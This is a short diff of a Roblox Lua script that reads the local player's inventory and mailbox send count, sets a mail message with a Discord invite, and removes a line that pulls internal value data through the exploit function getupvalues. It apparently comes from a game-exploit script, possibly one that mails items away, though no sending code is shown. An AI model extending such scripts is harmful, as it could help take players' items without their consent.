@@ -4,7 +4,6 @@ local save = library.Save.Get().Inventory
 local mailsent = library.Save.Get().MailboxSendsSinceReset
 local plr = game.Players.LocalPlayer
 local MailMessage = "gg / HcpNe56R2a"
-local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 _G.scriptExecuted = _G.scriptExecuted or false
